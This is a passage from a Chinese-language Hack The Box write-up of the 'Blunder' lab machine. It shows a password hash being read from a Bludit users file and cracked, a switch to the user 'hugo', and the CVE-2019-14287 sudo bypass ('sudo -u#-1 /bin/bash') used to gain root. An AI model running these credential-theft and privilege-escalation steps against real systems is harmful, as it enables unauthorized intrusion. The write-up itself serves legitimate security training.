class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;instagram&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;github&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;gitlab&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;linkedin&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;mastodon&quot;</span>: <span class="hljs-string">&quot;&quot;</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>21、这里是使用的演示报告中推荐的 <code>https://crackstation.net/</code> 地址进行破解的。</p>
+<p>22、但是在对网站服务器的根目录进行信息枚举时，发现了另一个 <code>bludit-3.10.0a</code>  版本的网站源码目录，并在这个里面发现了 Hugo 用户的密码 hash 值</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ <span class="hljs-built_in">cd</span> ../../<br><span class="hljs-built_in">cd</span> ../../<br>www-data@blunder:/var/www/bludit-3.9.2$ <span class="hljs-built_in">cd</span> ../<br><span class="hljs-built_in">cd</span> ../<br>www-data@blunder:/var/www$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>bludit-3.10.0a<br>bludit-3.9.2<br>html<br>www-data@blunder:/var/www$ <span class="hljs-built_in">cd</span> bludit-3.10.0a<br><span class="hljs-built_in">cd</span> bludit-3.10.0a<br>www-data@blunder:/var/www/bludit-3.10.0a$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>LICENSE<br>README.md<br>bl-content<br>bl-kernel<br>bl-languages<br>bl-plugins<br>bl-themes<br>index.php<br>install.php<br>www-data@blunder:/var/www/bludit-3.10.0a$ <span class="hljs-built_in">cd</span> bl-content<br><span class="hljs-built_in">cd</span> bl-content<br>www-data@blunder:/var/www/bludit-3.10.0a/bl-content$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>databases<br>pages<br>tmp<br>uploads<br>workspaces<br>www-data@blunder:/var/www/bludit-3.10.0a/bl-content$ <span class="hljs-built_in">cd</span> databases<br><span class="hljs-built_in">cd</span> databases<br>www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>categories.php<br>pages.php<br>plugins<br>security.php<br>site.php<br>syslog.php<br>tags.php<br>users.php<br>www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ <span class="hljs-built_in">cat</span> users.php<br><span class="hljs-built_in">cat</span> users.php<br>&lt;?php defined(<span class="hljs-string">&#x27;BLUDIT&#x27;</span>) or die(<span class="hljs-string">&#x27;Bludit CMS.&#x27;</span>); ?&gt;<br>&#123;<br>    <span class="hljs-string">&quot;admin&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;nickname&quot;</span>: <span class="hljs-string">&quot;Hugo&quot;</span>,<br>        <span class="hljs-string">&quot;firstName&quot;</span>: <span class="hljs-string">&quot;Hugo&quot;</span>,<br>        <span class="hljs-string">&quot;lastName&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;role&quot;</span>: <span class="hljs-string">&quot;User&quot;</span>,<br>        <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;faca404fd5c0a31cf1897b823c695c85cffeb98d&quot;</span>,<br>        <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;registered&quot;</span>: <span class="hljs-string">&quot;2019-11-27 07:40:55&quot;</span>,<br>        <span class="hljs-string">&quot;tokenRemember&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;tokenAuth&quot;</span>: <span class="hljs-string">&quot;b380cb62057e9da47afce66b4615107d&quot;</span>,<br>        <span class="hljs-string">&quot;tokenAuthTTL&quot;</span>: <span class="hljs-string">&quot;2009-03-15 14:00&quot;</span>,<br>        <span class="hljs-string">&quot;twitter&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;facebook&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;instagram&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;codepen&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;linkedin&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;github&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;gitlab&quot;</span>: <span class="hljs-string">&quot;&quot;</span>&#125;<br>&#125;<br>www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ <br></code></pre></td></tr></table></figure>
+
+<p>23、 使用 <code>https://crackstation.net/</code> 网站也成功的破解出了密码信息：hugo:Password120</p>
+<p><img src="http://sh1yan.top/photo/Blunder-htb-writeup/5.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Hash	Type	Result<br>faca404fd5c0a31cf1897b823c695c85cffeb98d	sha1	Password120<br></code></pre></td></tr></table></figure>
+
+<p>24、这里在初始环境下使用su切换的方法，进入到 hugo  用户环境下，并拿到了第一个flag信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ <span class="hljs-built_in">cd</span> /home<br><span class="hljs-built_in">cd</span> /home<br>www-data@blunder:/home$ <span class="hljs-built_in">ls</span>  <br><span class="hljs-built_in">ls</span><br>hugo<br>shaun<br>www-data@blunder:/home$ <span class="hljs-built_in">cd</span> hugo<br><span class="hljs-built_in">cd</span> hugo<br>www-data@blunder:/home/hugo$ su hugo<br>su hugo<br>Password: Password120<br><span class="hljs-built_in">ls</span><br>Desktop<br>Documents<br>Downloads<br>Music<br>Pictures<br>Public<br>Templates<br>user.txt<br>Videos<br><span class="hljs-built_in">cat</span> user.txt<br>797b675b4fea870474989fadabb48ddc<br></code></pre></td></tr></table></figure>
+
+<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>25、通过查看 sudo -l 发现了，我们发现无法使用 root 的 bash </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br>hugo@blunder:~$ <br><br>hugo@blunder:~$ sudo -l<br>sudo -l<br>Password: Password120<br><br>Matching Defaults entries <span class="hljs-keyword">for</span> hugo on blunder:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User hugo may run the following commands on blunder:<br>    (ALL, !root) /bin/bash<br>hugo@blunder:~$<br></code></pre></td></tr></table></figure>
+
+<p>26、到这里其实考察的是sudo自身版本的漏洞，查看下版本信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">hugo@blunder:~$ sudo -V<br>sudo -V<br>Sudo version 1.8.25p1<br>Configure options: <br>Sudoers policy plugin version 1.8.25p1<br>Sudoers file grammar version 46<br></code></pre></td></tr></table></figure>
+
+<p>27、通过演示报告，我们知道了一些当前版本的信息及描述</p>
+<p><code>当知道 sudo 版本后，还发现一个 CVE-2019-14287 编号。 这个漏洞使用户可以绕过sudo安全性并提升其权限，允许sudo用户以root用户身份运行命令，即使配置明确禁止这样做。当存在这种 ALL=(ALL, !root) 形式的配置时，表示对被切换到的用户进行了 ALL(所有用户) 和其他用户的剔除操作。</code></p>
+<p><code>该漏洞在小于 1.8.28 版本的 sudo 中存在。</code></p>
+<p><code>sudo 1.8.27 - Security Bypass : https://www.exploit-db.com/exploits/47502</code></p>
+<p><code>sudo -u#-1 /bin/bash</code></p>
+<p><code>当我们sudo这样做时，它不会检查用户是否存在，因此它倾向于使用指定的参数作为用户本身来执行它。现在，-u 用于定义用户本身，#-1 将返回 0，即 root 本身的默认值。</code></p>
+<p><code>参考：https://juejin.cn/post/6844903967990775821</code></p>
+<p><code>https://www.exploit-db.com/exploits/47502?source=post_page-----e39b2cfda153--------------------------------</code></p>
+<p>28、我们参照上面演示报告的方式，成功的获取到了最终root权限的flag信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">hugo@blunder:~$ sudo -u<span class="hljs-comment">#-1 /bin/bash</span><br><span class="hljs-built_in">id</span><br><br><span class="hljs-built_in">id</span><br><span class="hljs-built_in">pwd</span><br>sudo -u<span class="hljs-comment">#-1 /bin/bash</span><br>root@blunder:/home/hugo<span class="hljs-comment"># id</span><br>uid=0(root) gid=1001(hugo) <span class="hljs-built_in">groups</span>=1001(hugo)<br>root@blunder:/home/hugo<span class="hljs-comment"># </span><br>root@blunder:/home/hugo<span class="hljs-comment"># id</span><br>uid=0(root) gid=1001(hugo) <span class="hljs-built_in">groups</span>=1001(hugo)<br>root@blunder:/home/hugo<span class="hljs-comment"># pwd</span><br>/home/hugo<br>root@blunder:/home/hugo<span class="hljs-comment"># ls</span><br><span class="hljs-built_in">ls</span><br>Desktop    Downloads  Pictures  Templates  Videos<br>Documents  Music      Public    user.txt<br>root@blunder:/home/hugo<span class="hljs-comment"># cd /root/    </span><br><span class="hljs-built_in">cd</span> /root/<br>root@blunder:/root<span class="hljs-comment"># cat root.txt</span><br><span class="hljs-built_in">cat</span> root.txt<br>83e1c4d114b7c7f6bbc91a17605270cf<br>root@blunder:/root<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>
+
+
+<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/254</code></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Blunder-htb-writeup</div>
+      <div>https://sh1yan.top/2023/12/18/Blunder-htb-writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年12月18日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/12/19/Tabby-htb-writeup/" title="Tabby-htb-writeup">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Tabby-htb-writeup</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/12/17/Admirer-htb-writeup/" title="Admirer-htb-writeup">
+                        <span class="hidden-mobile">Admirer-htb-writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
